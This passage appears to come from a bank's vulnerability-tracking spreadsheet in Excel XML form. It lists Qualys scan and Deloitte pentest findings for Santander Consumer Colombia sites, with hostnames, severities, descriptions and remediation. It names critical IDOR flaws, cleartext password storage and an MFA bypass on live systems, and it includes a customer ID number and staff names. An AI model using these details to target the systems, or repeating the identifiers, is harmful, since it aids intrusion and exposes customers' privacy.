    <s v="QA-WAS-c0215114-6182-4b87-abf6-43f32e14a0e0"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2025/"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="238"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-d7a5cd65-eb14-45d7-b39a-63d0007078c2"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2025/03/"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="239"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-690c86af-d2bf-43df-b431-c6d2ceb1cc10"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2025-05-24T00:00:00"/>
    <n v="395"/>
    <d v="2025-08-2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Vargas"/>
  </r>
  <r>
    <n v="240"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-40e61983-cab6-4bac-b012-85d1ae84d824"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/Home/"/>
    <m/>
    <m/>
    <d v="2025-05-24T00:00:00"/>
    <n v="395"/>
    <d v="2025-08-2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Vargas"/>
  </r>
  <r>
    <n v="241"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-ba325842-44db-4858-bc1f-0ebb62047489"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/Home/After"/>
    <m/>
    <m/>
    <d v="2025-05-24T00:00:00"/>
    <n v="395"/>
    <d v="2025-08-2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Vargas"/>
  </r>
  <r>
    <n v="242"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-19473e4c-824b-4b5d-b11d-054a443addef"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/Home/Before"/>
    <m/>
    <m/>
    <d v="2025-05-24T00:00:00"/>
    <n v="395"/>
    <d v="2025-08-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The web page can be framed. This means that clickjacking attacks against users are possible."/>
    <s v="Common clickjacking prevention mechanisms include:_x000a_X-Frame-Options: This is an HTTP response header that is used to prevent framing of the web page._x000a_Framekiller JavaScript code: Special JS code can be used to prevent a malicious user from framing the page. This method is less reliable than using X-Frame-Options."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="243"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-VM-8949831728521931337"/>
    <m/>
    <x v="100"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="experiencia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-03-08T00:00:00"/>
    <n v="472"/>
    <d v="2025-06-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <m/>
    <m/>
    <m/>
    <s v="Validar"/>
  </r>
  <r>
    <n v="244"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-a15d1c0d-57e0-41d5-bd24-8d7a61f3daee"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/not-found/index.html"/>
    <m/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
    <s v="Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="245"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-c86595e9-ae9a-4760-b72a-a609d664997d"/>
    <m/>
    <x v="101"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="6.1"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2024-09-11T00:00:00"/>
    <n v="650"/>
    <d v="2024-12-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Bootstrap is a free and open source CSS framework directed at responsive web development. It contains HTML, CSS and JavaScript based design templates for typography, forms, buttons, navigation, and other interface components._x000a__x000a_The web application is using a JavaScript library that is known to contain at least one vulnerability."/>
    <s v="Please refer to the information provided in the response section.  Also check the vendor's security advisories related to the vulnerable version of the library."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="246"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="QA-WAS-0579036e-4b5e-4426-a7b5-8e4bb98be69c"/>
    <m/>
    <x v="94"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://garantia.santanderconsumer.co/Home/Before"/>
    <m/>
    <m/>
    <d v="2023-02-18T00:00:00"/>
    <n v="1221"/>
    <d v="2023-05-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="247"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SCO-25-CNMPO-005-AP001"/>
    <x v="102"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar, poniendo en riesgo el identificador de sesión del usuario cuando se encuentra en tránsito."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados. La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <m/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="248"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-685a86106c975521ca41233c"/>
    <s v="SCO-25-CNAPA-003-AP-001"/>
    <x v="103"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="6.2"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-09-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación analizada almacena las contraseñas de los usuarios de la api en texto claro o mediante un cifrado reversible. De esta manera, cualquier atacante podría acceder de manera directa a las credenciales de los usuarios ."/>
    <s v="Se debe almacenar la contraseña de los usuarios de manera segura y no se deben exponer_x000a_credenciales para otros entornos. "/>
    <s v="De explotar esta vulnerabilidad, un atacante podría acceder a las credenciales de los usuarios almacenadas en la aplicación con la finalidad de suplantar a los usuarios legítimos en el aplicativo consiguiendo así acceso a otros entornos . Además, es posible que estas credenciales se puedan utilizar en otros aplicativos o servicios, lo que le permitiría a un atacante ampliar el alcance del ataque."/>
    <d v="2025-09-19T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="249"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-685a86496c975521ca41233d"/>
    <s v="SCO-25-CNAPA-003-AP-002"/>
    <x v="104"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.2"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-09-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas, se ha comprobado que la aplicación no consta de un sistema de autenticación de doble factor correctamente implementado ya que es posible el uso de la api principal sin utilizar el proceso de doble factor."/>
    <s v="Se recomienda implementar un sistema de doble factor de autenticación, basado en un token_x000a_aleatorio de un sólo uso, que genere una clave aleatoria cada 30 segundos para permitir al_x000a_usuario operar con las funcionalidades más críticas de la aplicación."/>
    <s v="Si no se protegen las operativas críticas del aplicativo mediante un segundo factor de autenticación un atacante con acceso a una sesión de usuario podría utilizar este tipo de operativas privilegiadas."/>
    <d v="2025-09-19T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="250"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SCO-25-CNAPA-003-AP-003"/>
    <x v="105"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El aplicativo auditado hace uso de la tecnología &quot;JSON Web Token&quot; para autenticar a los usuarios de la aplicación. Se ha observado que en el propio token JWT se envía información catalogada como sensible que puede ser accesible en texto claro."/>
    <s v="Se recomienda no incluir información sensible en el token JWT. En caso de incluir información_x000a_que pueda catalogarse como sensible se recomienda cifrar la información contenida en el_x000a_mismo o, en su defecto, cifrar la información sensible."/>
    <s v="Un atacante que consiga capturar un token JWT de un usuario legítimo de la aplicación puede_x000a_acceder a la información sensible transmitida en este token incluso aunque la validez del token_x000a_hubiera expirado"/>
    <d v="2025-09-19T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="251"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SCO-25-CNAPA-003-AP-004"/>
    <x v="106"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no presenta ningún tipo de protección contra ataques de automatización de peticiones HTTP. De esta manera, un atacante podría automatizar la realización de numerosas peticiones sobre algunos parámetros de entrada de la aplicación con el objetivo de averiguar, mediante fuerza bruta, información de la misma como pudieran ser, nombres de usuario, credenciales, identificadores de usuario, etc."/>
    <s v="Se recomienda implementar un sistema que impida la automatización de peticiones como,_x000a_por ejemplo, un sistema de bloqueo por dirección IP ante un número de peticiones elevado_x000a_en un tiempo definido o un sistema tipo CAPTCHA, que se le presente al usuario después de_x000a_un número de intentos de averiguación del dato. Este umbral ha de ser ajustado dependiendo_x000a_del tipo de aplicación y la lógica de la misma, por ejemplo, mostrar el sistema CAPTCHA cuando_x000a_se exceda de 5 intentos de averiguación en menos de 1 minuto."/>
    <s v="De no bloquear los ataques automatizados de fuerza bruta, un atacante podría llevar a cabo con éxito la obtención de nombres de usuario de la aplicación, correos electrónicos válidos e incluso averiguar credenciales de un usuario legítimo de la aplicación."/>
    <d v="2025-09-19T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="252"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SCO-25-CNAPA-003-CO-005"/>
    <x v="34"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento._x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una_x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite_x000a_una mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de_x000a_rendimiento en las solicitudes afectadas._x000a_A continuación, se muestra cómo se deshabilita la compresión HTTP para Apache y NGINX:_x000a_Deshabilitar compresión en Apache:_x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando:_x000a_ $ sudo a2dismod deflate_x000a_• Reinicie el servidor:_x000a_ $ sudo /etc/init.d/apache2 restart_x000a_Deshabilitar compresión en NGINX:_x000a_• Establezca la configuración del host con la opción gzip en off:_x000a_ server {_x000a_ server_name www.example.com;_x000a_ listen 443 ssl http2;_x000a_ gzip off;_x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal de comunicaciones (datos personales, credenciales de usuario, identificadores_x000a_de sesión, etc.)."/>
    <d v="2025-10-23T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="253"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SCO-25-CNAPA-003-CO-006"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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Chaining) son potencialmente vulnerables a este tipo ataques. "/>
    <s v="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Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace:_x000a_• https://www.openssl.org/source/"/>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d v="2025-10-23T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="254"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <s v="SCO-25-CNMPO-004-CO-001"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/O_x000a_riginacionPROD/"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por una vulnerabilidad conocida como Lucky13. Según se ha podido determinar el servidor utiliza cifrados CBC sobre TLS, lo que permitiría a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque conocido como Padding de Oracle (POODLE). Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-BlockChaining) son potencialmente vulnerables a este tipo ataques. "/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. "/>
    <s v="El protocolo TLS v1.1 y v1.2 y el protocolo DTLS v1.0 y v1.2, tal como se utiliza en OpenSSL, OpenJDK, PolarSSL, y otros productos, no considera adecuadamente ataques a un requisito de verificación MAC durante el proceso de relleno CBC malformado, lo que permite a atacantes remotos realizar ataques distintivos y los ataques de recuperación de texto plano a través del análisis estadístico de los datos de tiempo de los paquetes transmitidos."/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="255"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="servicios santander"/>
    <m/>
    <s v="SC-25-CNMPO-002-AP-001"/>
    <x v="107"/>
    <m/>
    <x v="1"/>
    <s v="Critical"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-16T00:00:00"/>
    <n v="372"/>
    <d v="2025-06-26T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el ejercicio de Hacking ético sobre la aplicación analizada, se ha identificado la ausencia de control de privilegios de un usuario a la hora de consultar los datos del perfil, permitiendo a cualquier usuario consultar los datos de cualquier cliente,  Conociendo únicamente la cédula."/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para_x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene_x000a_privilegios de acceso a la información consultada._x000a_En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el_x000a_aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a_x000a_consultar, crear, modificar, o borrar._x000a_Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie_x000a_a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el_x000a_usuario antes de su envío al servidor"/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo direct+AD356amente modificando el valor de un  parámetro utilizado para apuntar directamente a un objeto, en este caso, el identificador de un usuario para actuar sobre su foto de perfil. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación"/>
    <s v="1° Fecha 25/06/2025"/>
    <s v="Certificada"/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="256"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="servicios santander"/>
    <m/>
    <s v="SC-25-CNMPO-002-AP-002"/>
    <x v="107"/>
    <m/>
    <x v="1"/>
    <s v="Critical"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-16T00:00:00"/>
    <n v="372"/>
    <d v="2025-06-26T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el ejercicio de Hacking ético sobre la aplicación analizada, se ha identificado la ausencia de control de privilegios de un usuario a la hora de consultar el certificado de Deuda del año 2024. Para evidenciar la vulnerabilidad, primero se inicia sesión con el usuario “1077034607”, adquiriendo su token JWT (el cual acaba en  Nq40UiUZ6Zw) y accediendo al informe de certificación de deuda del año 2024"/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para_x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene_x000a_privilegios de acceso a la información consultada._x000a_En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el_x000a_aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a_x000a_consultar, crear, modificar, o borrar._x000a_Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie_x000a_a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el_x000a_usuario antes de su envío al servidor."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un  parámetro utilizado para apuntar directamente a un objeto, en este caso, el identificador de un usuario para actuar sobre su foto de perfil. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación"/>
    <s v="1° Fecha 25/06/2025"/>
    <s v="Certificada"/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="257"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="servicios santander"/>
    <m/>
    <s v="SC-25-CNMPO-002-AP-003"/>
    <x v="107"/>
    <m/>
    <x v="1"/>
    <s v="Critical"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-19T00:00:00"/>
    <n v="369"/>
    <d v="2025-06-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el ejercicio de Hacking ético sobre la aplicación analizada, se ha identificado la ausencia de control de privilegios de un usuario a la hora de consultar los datos del perfil, permitiendo a cualquier usuario consultar los datos de cualquier cliente, conociendo únicamente la cédula"/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para_x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada. En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a consultar, crear, modificar, o borrar. Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el usuario antes de su envío al servidor."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto en este caso, la cédula de cualquier cliente. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a_x000a_la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación."/>
    <s v="1° Fecha 25/06/2025"/>
    <s v="Certificada"/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="258"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-686bb23170644f0580904fb8"/>
    <s v="SCO-25-CNMPA-007-VE-001 "/>
    <x v="7"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-10-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que es posible degradar el rendimiento de la aplicación y el servidor remoto que la sustenta. Siendo posiblemente vulnerable a una denegación de servicio de la infraestructura e impidiendo que la aplicación pueda prestar servicio a los usuarios legítimos de la aplicación._x000a__x000a_The Apache_x000a_HTTP Server 1.x_x000a_and 2.x_x000a_CVE-2007-_x000a_6750_x000a_"/>
    <s v="Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas_x000a_para la versión utilizada, se recomienda instalar los parches de seguridad específicos que pongan_x000a_en riesgo la seguridad del sistema."/>
    <s v="Un atacante podría automatizar la ejecución de la funcionalidad afectada con la finalidad de_x000a_aumentar el tiempo de respuesta de la aplicación de manera global. Impactando directamente en la_x000a_disponibilidad de la misma llegando, en algunos casos, a impedir que la aplicación o ciertas_x000a_operaciones puedan estar disponibles para los usuarios legítimos."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="259"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-686bb26370644f0580904ff1"/>
    <s v="SCO-25-CNMPA-007-CO-002"/>
    <x v="108"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-10-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="SMBv2 exploit es una vulnerabilidad crítica en el controlador del kernel de Windows (srv2.sys) que afecta la implementación del protocolo 445. Fue descubierta en sistemas Windows Vista y Windows Server 2008 (sin R2). El fallo ocurre cuando un atacante remoto no autenticado envía un paquete SMBv2 especialmente_x000a_manipulado al puerto 445/TCP, lo que provoca un desbordamiento de búfer que permite la ejecución remota de código (RCE) en modo kernel."/>
    <s v="1- Aplicar el parche oficial de seguridad publicado por Microsoft en el boletín MS09-050, el cual_x000a_corrige específicamente esta vulnerabilidad._x000a_• Referencia: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2009-3103_x000a_2- Actualizar el sistema operativo a una versión más reciente y soportada, como Windows 10,_x000a_Windows Server 2016 o superior, ya que las versiones vulnerables (Windows Vista y Server 2008 sin_x000a_R2) han alcanzado su fin de soporte._x000a_3- Restringir el acceso al puerto 445/TCP mediante políticas de firewall. Este puerto solo debe_x000a_estar accesible desde redes internas de confianza._x000a_• Asegurarse de bloquear completamente el acceso externo al servicio SMB desde_x000a_Internet._x000a_4- Deshabilitar el protocolo SMBv2 si no es necesario, como medida temporal de mitigación._x000a_5- Monitorizar el tráfico de red en busca de actividad anómala relacionada con SMB,_x000a_especialmente escaneos o paquetes sospechosos dirigidos al puerto 445._x000a_6- Segmentar la red interna y aplicar el principio de mínimo privilegio, para reducir el riesgo de_x000a_movimientos laterales en caso de compromiso de un equipo."/>
    <s v="La vulnerabilidad CVE-2009-3103 permite a un atacante remoto, sin necesidad de autenticación, ejecutar código arbitrario en el sistema afectado mediante el envío de paquetes SMBv2 especialmente diseñados al puerto TCP 445. Este tipo de vulnerabilidad, catalogada como ejecución remota de código (RCE), afecta directamente al núcleo del sistema operativo (modo kernel), lo que le otorga al atacante control_x000a_total sobre el equipo comprometido."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="260"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <m/>
    <s v="SCO-25-CNMPA-007-CO-005 "/>
    <x v="109"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.9"/>
    <m/>
    <m/>
